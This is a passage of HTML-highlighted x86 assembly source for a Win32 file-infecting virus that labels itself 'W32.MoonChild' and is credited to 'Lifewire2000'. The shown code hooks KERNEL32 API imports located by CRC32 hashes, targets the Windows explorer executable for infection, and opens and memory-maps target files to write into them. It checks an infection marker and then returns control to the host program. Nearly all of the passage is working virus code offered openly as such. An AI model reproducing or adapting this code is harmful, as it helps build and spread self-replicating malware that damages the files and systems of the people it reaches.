        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">iGetModuleHandleA</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;RVA pointer to PE</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;Importtable RVA</span><span class="sc0">

        </span><span class="sc1">;ECX = import table header, EAX = base</span><span class="sc0">

</span><span class="sc5">SearchRightImportDLL</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;edx&lt;-pointer to NAME1/DLL to import</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc3">"LENR"</span><span class="sc0">        </span><span class="sc1">;KE-RNEL-32.DLL ?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">dll2hookOK</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">EndOfImport</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">14h</span><span class="sc0">                 </span><span class="sc1">;size</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">SearchRightImportDLL</span><span class="sc0">

</span><span class="sc5">dll2hookOK</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc1">;ECX = right import header</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;*** mov</span><span class="sc0">

        </span><span class="sc1">;EDX = base, ESI points to array with DWORDS that point to API-names</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hookedapicrcs</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">ResearchRightAPIs</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">;EAX = Array with addresses of API's</span><span class="sc0">
</span><span class="sc5">ImportHookApiSearchLoop</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">                           </span><span class="sc1">;EAX = RVA of word / asciiz struc</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">lastapi</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;esi &lt;- edx+ex+2 = VA off API asciiz</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">crc32</span><span class="sc0">                   </span><span class="sc1">;calculate crc32</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">                     </span><span class="sc1">;ESI&lt;-array with dword of RVA of API</span><span class="sc0">
</span><span class="sc1">;***    mov     ebx,eax                 ;EBX&lt;-crc32</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;CRC32 of api == hookCRC ?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">ImportHookApiSearchLoop</span><span class="sc0"> </span><span class="sc1">;not the api we wanna hook?</span><span class="sc0">

        </span><span class="sc1">;--- HOOK API --                ;Hook that API!</span><span class="sc0">

        </span><span class="sc6">pushad</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">hookedapicrcs</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HookOffsetsTable</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">                 </span><span class="sc1">;EDI&lt;-RightHookHandler</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
        
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">nopop</span><span class="sc0"> 

</span><span class="sc5">lastapi</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">nopop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">endhookcrcs</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;all API-CRC's checked?</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">ResearchRightAPIs</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc5">EndOfImport</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;       ***     Runtime infect  ***</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">buffer</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">260d</span><span class="sc0">                            </span><span class="sc1">;MAX_PATH</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">iGetWindowsDirectoryA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">;buffer</span><span class="sc0">
</span><span class="sc1">;***        or      eax,eax</span><span class="sc0">
</span><span class="sc1">;***        jz      NoWinDir                        ;??!</span><span class="sc0">


        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">NoWinDir</span><span class="sc0">
        
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc1">;***        add     edi,eax                         ;buffer+length</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">explorerfn</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;***        mov     ecx,explorerfnsz</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">explorerfnsz</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect</span><span class="sc0">                          </span><span class="sc1">;infect %windir%\explorer.exe</span><span class="sc0">
</span><span class="sc5">NoWinDir</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">iBeep</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">                   </span><span class="sc1">;12345678 will be patched</span><span class="sc0">
</span><span class="sc5">back2real</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">

</span><span class="sc5">copyright</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"&lt;W32.MoonChild."</span><span class="sc4">,</span><span class="sc5">virusRsize</span><span class="sc4">/</span><span class="sc2">1000</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">+</span><span class="sc12">'0'</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">virusRsize</span><span class="sc4">/</span><span class="sc2">0100</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">+</span><span class="sc12">'0'</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">virusRsize</span><span class="sc4">/</span><span class="sc2">0010</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">+</span><span class="sc12">'0'</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">virusRsize</span><span class="sc4">/</span><span class="sc2">0001</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">+</span><span class="sc12">'0'</span><span class="sc4">,</span><span class="sc3">" by Lifewire2000 [IKX?] - Thx to PiepPiep!&gt;"</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;       ***     Virus did his jobs, return to our host  ***</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">

</span><span class="sc5">returntohost</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">oldelta</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">OrgHostCode</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">Jmp2VirusCodeSz</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                           </span><span class="sc1">;restore bytes from host</span><span class="sc0">

        </span><span class="sc6">popad</span><span class="sc0">

        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">

        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">                             </span><span class="sc1">;jmp to virus coded putted offset</span><span class="sc0">
                                        </span><span class="sc1">;on the stack...</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">

</span><span class="sc5">explorerfn</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"\EXPLORAH.EXE"</span><span class="sc0">
</span><span class="sc5">explorerfnsz</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">explorerfn</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc5">crc32</span><span class="sc4">:</span><span class="sc0">                                          </span><span class="sc1">;ofcourse i stole this... :)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">__mCRC32_init</span><span class="sc0">
    </span><span class="sc5">__gCRC32_next_byte</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">           </span><span class="sc1">;end of name ?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__gCRC32_finish</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
    </span><span class="sc5">__gCRC32_next_bit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">__gCRC32_no_change</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">__mCRC32</span><span class="sc0">
    </span><span class="sc5">__gCRC32_no_change</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__gCRC32_next_bit</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__gCRC32_next_byte</span><span class="sc0">
    </span><span class="sc5">__gCRC32_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">;CRC32 to EAX</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;       ***     infects the file at ESI ***</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">

</span><span class="sc1">;The hugest &amp; lamest PE infector ever, (C) Lifewire :)</span><span class="sc0">

</span><span class="sc5">infect</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">blaatorweg</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">filenametemp</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">blaatorweg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infectfile</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc5">returninfect</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">infectfile</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">if</span><span class="sc0"> </span><span class="sc5">debug</span><span class="sc0"> </span><span class="sc9">eq</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc9">endif</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">checkname</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">returninfect</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">iGetFileAttributesA</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;Save old ATTRs</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">err_b4_open</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc5">oldattr</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">iSetFileAttributesA</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;Reset them</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">err_b4_open</span><span class="sc0">


</span><span class="sc1">;***        xor     eax,eax</span><span class="sc0">

        </span><span class="sc6">cdq</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">iCreateFileA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">err_b4_open</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fileh</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                                     </span><span class="sc1">;handle</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">iGetFileSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">err_opened</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc1">;***        mov     ecx,101</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">101</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                                     </span><span class="sc1">;if remaineder = 0</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">err_opened</span><span class="sc0">                              </span><span class="sc1">;already infected</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">10000</span><span class="sc0">                               </span><span class="sc1">;some workspace</span><span class="sc0">

</span><span class="sc1">;***        xor     edx,edx</span><span class="sc0">

        </span><span class="sc6">cdq</span><span class="sc0">                                     </span><span class="sc1">;only worx if eax&lt;80000000,</span><span class="sc0">
                                                </span><span class="sc1">;i don't hope filesize &gt; 80000 :)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                                     </span><span class="sc1">;max size low</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                                     </span><span class="sc1">;handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">iCreateFileMappingA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">err_mapped</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">filemaph</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_MAP_WRITE</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">iMapViewOfFile</span><span class="sc4">]</span><span class="sc0">       

